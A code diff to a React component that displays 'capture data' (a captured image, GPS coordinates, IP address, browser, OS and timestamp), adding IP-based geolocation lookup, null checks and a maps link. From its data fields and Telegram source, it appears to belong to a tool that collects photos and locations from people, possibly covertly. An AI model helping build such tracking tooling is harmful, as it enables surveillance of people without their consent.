@@ -3,38 +3,72 @@
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
 import { MapPin, Globe, Monitor, Calendar, Flag } from "lucide-react"
 import { CaptureData } from "@/services/telegram"
+import { useState, useEffect } from "react"
 
 interface CaptureDataDisplayProps {
   data: CaptureData
 }
 
+interface LocationData {
+  country: string
+  city: string
+  region: string
+  flag: string
+}
+
 export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
   const { deviceInfo, location, image } = data
+  const [locationData, setLocationData] = useState<LocationData | null>(null)
+  const [loading, setLoading] = useState(true)
 
-  // Get country from IP
-  const getCountryFromIP = async (ip: string) => {
+  useEffect(() => {
+    const fetchLocationData = async () => {
+      try {
+        const response = await fetch(`https://ipapi.co/${deviceInfo.ip}/json/`)
+        if (!response.ok) throw new Error('Failed to fetch location data')
+        const data = await response.json()
+        setLocationData({
+          country: data.country_name || "Unknown",
+          city: data.city || "Unknown",
+          region: data.region || "Unknown",
+          flag: (data.country_code || "xx").toLowerCase()
+        })
+      } catch (error) {
+        console.error('Error fetching location data:', error)
+        setLocationData({
+          country: "Unknown",
+          city: "Unknown",
+          region: "Unknown",
+          flag: "xx"
+        })
+      } finally {
+        setLoading(false)
+      }
+    }
+
+    if (deviceInfo?.ip) {
+      fetchLocationData()
+    } else {
+      setLoading(false)
+    }
+  }, [deviceInfo?.ip])
+
+  const formatDate = (dateString: string) => {
     try {
-      const response = await fetch(`https://ipapi.co/${ip}/json/`)
-      const data = await response.json()
-      return {
-        country: data.country_name,
-        city: data.city,
-        region: data.region,
-        flag: data.country_code?.toLowerCase()
-      }
+      return new Date(dateString).toLocaleString()
     } catch (error) {
-      return {
-        country: "Unknown",
-        city: "Unknown",
-        region: "Unknown",
-        flag: "xx"
-      }
+      return "Unknown date"
     }
   }
 
-  // Format date
-  const formatDate = (dateString: string) => {
-    return new Date(dateString).toLocaleString()
+  if (loading) {
+    return (
+      <Card className="bg-gray-900/50 backdrop-blur-sm border-gray-800">
+        <CardContent className="p-6">
+          <p className="text-gray-400">Loading data...</p>
+        </CardContent>
+      </Card>
+    )
   }
 
   return (
@@ -44,13 +78,18 @@ export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
       </CardHeader>
       <CardContent className="space-y-4">
         {/* Image */}
-        <div className="relative aspect-video rounded-lg overflow-hidden">
-          <img
-            src={image}
-            alt="Captured image"
-            className="w-full h-full object-cover"
-          />
-        </div>
+        {image && (
+          <div className="relative aspect-video rounded-lg overflow-hidden">
+            <img
+              src={image}
+              alt="Captured image"
+              className="w-full h-full object-cover"
+              onError={(e) => {
+                e.currentTarget.src = '/placeholder-image.jpg'
+              }}
+            />
+          </div>
+        )}
 
         {/* Location */}
         <div className="space-y-2">
@@ -59,21 +98,36 @@ export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
             <h3 className="font-semibold">Location</h3>
           </div>
           <div className="pl-7 space-y-1">
+            {locationData && (
+              <div className="flex items-center gap-2 mb-2">
+                <img
+                  src={`https://flagcdn.com/w20/${locationData.flag}.png`}
+                  alt={locationData.country}
+                  className="w-5 h-3"
+                />
+                <span className="text-sm text-gray-400">
+                  {locationData.city}, {locationData.region}, {locationData.country}
+                </span>
+              </div>
+            )}
             <p className="text-sm text-gray-400">
-              Latitude: {location.latitude}
+              Latitude: {location?.latitude || "Unknown"}
             </p>
             <p className="text-sm text-gray-400">
-              Longitude: {location.longitude}
+              Longitude: {location?.longitude || "Unknown"}
             </p>
-            <iframe
-              src={`https://www.google.com/maps/embed/v1/place?key=YOUR_GOOGLE_MAPS_API_KEY&q=${location.latitude},${location.longitude}`}
-              width="100%"
-              height="200"
-              style={{ border: 0 }}
-              allowFullScreen
-              loading="lazy"
-              referrerPolicy="no-referrer-when-downgrade"
-            />
+            {location?.latitude && location?.longitude && (
+              <div className="mt-2">
+                <a
+                  href={`https://www.google.com/maps?q=${location.latitude},${location.longitude}`}
+                  target="_blank"
+                  rel="noopener noreferrer"
+                  className="text-blue-400 hover:text-blue-300 text-sm"
+                >
+                  View on Google Maps
+                </a>
+              </div>
+            )}
           </div>
         </div>
 
@@ -85,13 +139,13 @@ export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
           </div>
           <div className="pl-7 space-y-1">
             <p className="text-sm text-gray-400">
-              IP: {deviceInfo.ip}
+              IP: {deviceInfo?.ip || "Unknown"}
             </p>
             <p className="text-sm text-gray-400">
-              Browser: {deviceInfo.browser}
+              Browser: {deviceInfo?.browser || "Unknown"}
             </p>
             <p className="text-sm text-gray-400">
-              OS: {deviceInfo.os}
+              OS: {deviceInfo?.os || "Unknown"}
             </p>
           </div>
         </div>
@@ -99,7 +153,7 @@ export function CaptureDataDisplay({ data }: CaptureDataDisplayProps) {
         {/* Timestamp */}
         <div className="flex items-center gap-2 text-sm text-gray-400">
           <Calendar className="h-4 w-4" />
-          <span>{formatDate(deviceInfo.timestamp)}</span>
+          <span>{deviceInfo?.timestamp ? formatDate(deviceInfo.timestamp) : "Unknown"}</span>
         </div>
       </CardContent>
     </Card>
